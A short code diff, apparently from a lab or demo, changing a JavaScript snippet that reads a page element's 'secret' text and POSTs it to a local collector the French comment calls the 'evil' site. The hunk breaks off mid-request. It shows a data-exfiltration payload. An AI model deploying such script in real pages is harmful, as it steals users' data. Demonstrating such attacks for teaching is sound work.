@@ -1,7 +1,7 @@
 const secret = document.getElementById('secret').innerText;
 
 //envoie du secret vers le site evil
-fetch("http://localhost:9999/collect", {
+fetch("http://localhost:9999/collect.php", {
     method: "POST",
     headers: {
         "Content-Type": "application/json"
